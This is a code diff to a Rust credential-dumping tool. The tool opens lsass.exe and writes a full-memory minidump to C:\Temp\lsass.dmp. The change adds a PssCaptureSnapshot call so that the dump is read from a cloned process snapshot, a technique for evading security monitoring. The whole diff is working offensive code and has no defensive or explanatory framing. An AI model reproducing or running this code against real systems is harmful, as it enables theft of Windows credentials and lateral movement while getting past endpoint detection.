@@ -13,9 +13,15 @@ use windows_sys::{
         },
         Storage::FileSystem::{CREATE_ALWAYS, CreateFileA, FILE_ATTRIBUTE_NORMAL},
         System::{
-            Diagnostics::Debug::{
-                MiniDumpWithFullMemory, MiniDumpWithFullMemoryInfo, MiniDumpWithThreadInfo,
-                MiniDumpWriteDump,
+            Diagnostics::{
+                Debug::{
+                    MiniDumpWithFullMemory, MiniDumpWithFullMemoryInfo, MiniDumpWithThreadInfo,
+                    MiniDumpWriteDump,
+                },
+                ProcessSnapshotting::{
+                    PSS_CAPTURE_THREAD_CONTEXT, PSS_CAPTURE_THREADS, PSS_CAPTURE_VA_CLONE,
+                    PSS_CREATE_BREAKAWAY_OPTIONAL, PssCaptureSnapshot,
+                },
             },
             Threading::{
                 GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION,
@@ -164,6 +170,23 @@ fn main() {
 
         println!("[+] Opened handle to lsass.exe process: {:?}", lsass_handle);
 
+        let mut snapshot: *mut c_void = null_mut();
+        if PssCaptureSnapshot(
+            lsass_handle,
+            PSS_CAPTURE_VA_CLONE
+                | PSS_CAPTURE_THREADS
+                | PSS_CAPTURE_THREAD_CONTEXT
+                | PSS_CREATE_BREAKAWAY_OPTIONAL,
+            0x001F_FFFF,
+            &mut snapshot,
+        ) != 0
+        {
+            println!("[-] Failed to capture snapshot of lsass.exe process");
+            return;
+        }
+
+        println!("[+] Captured snapshot of lsass.exe process: {:?}", snapshot);
+
         let file_handle = CreateFileA(
             "C:\\Temp\\lsass.dmp\0".as_ptr() as *const u8,
             GENERIC_WRITE,
@@ -180,7 +203,7 @@ fn main() {
         }
 
         if MiniDumpWriteDump(
-            lsass_handle,
+            snapshot,
             pid,
             file_handle,
             MiniDumpWithFullMemory | MiniDumpWithFullMemoryInfo | MiniDumpWithThreadInfo,
